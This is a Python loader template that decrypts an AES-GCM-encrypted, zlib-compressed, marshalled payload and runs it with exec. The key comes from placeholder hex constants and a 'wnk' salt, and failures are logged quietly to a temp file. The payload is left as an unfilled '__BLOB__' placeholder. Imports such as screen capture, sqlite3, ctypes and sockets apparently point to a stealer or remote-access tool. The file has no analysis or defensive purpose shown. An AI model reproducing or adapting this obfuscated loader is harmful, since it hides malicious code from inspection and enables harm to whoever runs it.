import os, sys, zlib, marshal, base64, hashlib, traceback, time, socket, ssl, json, struct
import threading, queue, random, string, re, subprocess, tempfile, shutil, sqlite3, glob
import ctypes, ctypes.wintypes, platform, uuid
import PIL.ImageGrab
from Crypto.Cipher import AES

_S1 = "__S1__"
_S2 = "__S2__"
_SALT = "__SALT__"
_BLOB = "__BLOB__"


def _key():
    x = bytes.fromhex(_S1) + bytes.fromhex(_S2)
    return hashlib.sha256(x + b"wnk" + bytes.fromhex(_SALT)).digest()


def _run():
    raw = base64.b64decode(_BLOB)
    nonce, ct, tag = raw[:12], raw[12:-16], raw[-16:]
    c = AES.new(_key(), AES.MODE_GCM, nonce=nonce)
    code = marshal.loads(zlib.decompress(c.decrypt_and_verify(ct, tag)))
    exec(code, {"__name__": "__main__", "__file__": sys.executable})


if __name__ == "__main__":
    try:
        _run()
    except Exception:
        try:
            with open(os.path.join(tempfile.gettempdir(), "wnk_err.log"), "a") as f:
                f.write(time.strftime("%Y-%m-%d %H:%M:%S ") + traceback.format_exc() + "\n")
        except Exception:
            pass
